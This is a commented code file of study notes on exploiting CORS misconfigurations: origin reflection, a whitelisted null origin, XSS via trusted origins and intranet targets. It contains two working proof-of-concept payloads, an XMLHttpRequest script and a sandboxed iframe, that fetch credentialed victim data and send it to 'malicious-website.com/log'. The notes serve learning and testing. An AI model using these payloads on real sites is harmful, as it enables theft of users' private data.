// Cross-origin resource sharing
//! Definitions
//* CORS
// its a browser mechanism which enalbes controlled access to resources located
// outside of a given domain
//* Same-Origin Policy
// The same-origin policy restricts scripts on one origin from accessing data from another origin.
// An origin consists of a URI scheme, domain and port number.
//? note :
// a server can choose to allow cors so on respnose it sets the Access-Control-Allow-Origin header to *
//! Exploiting
//* Origin refletion
// if the server reflects the origin in the Access-Control-Allow-Origin header
// then you can set the origin to a domain you control and then you can access the response
// <script>
//    var req = new XMLHttpRequest();
//    req.onload = reqListener;
//    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
//    req.withCredentials = true;
//    req.send();
//
//    function reqListener() {
//    	location='//malicious-website.com/log?key='+this.responseText;
//    };
// </script>
//* White listed null origin
// sending origin : null
// will grant you access if it's whitelisted
// you can do that using this iframe
//<iframe
//  sandbox="allow-scripts allow-top-navigation allow-forms"
//  src="data:text/html
//  ,<script>
//    var req = new XMLHttpRequest();
//    req.onload = reqListener;
//    req.open('get','vulnerable-website.com/sensitive-victim-data',true);
//    req.withCredentials = true;
//    req.send();
//
//    function reqListener() {
//    location='malicious-website.com/log?key='+this.responseText;
//      };
//    </script>">
//</iframe>;
//* Exploiting XSS via CORS trust relationships
// If a website trusts an origin that is vulnerable to cross-site scripting (XSS),
// then an attacker could exploit the XSS to inject some JavaScript
// that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
//* Intranets and CORS without credentials
// if the Access-Control-Allow-Credentials header is not set to true
// the browser will not send the cookies
// but this is not the case for intranet applications
// usually this attack is used when the attacker can't acces the website directly
// so for example if an xss found in a trusted website by an internal service
// an attacker can go far because usually interal server don't get that much security
// because it's not exposed to the internet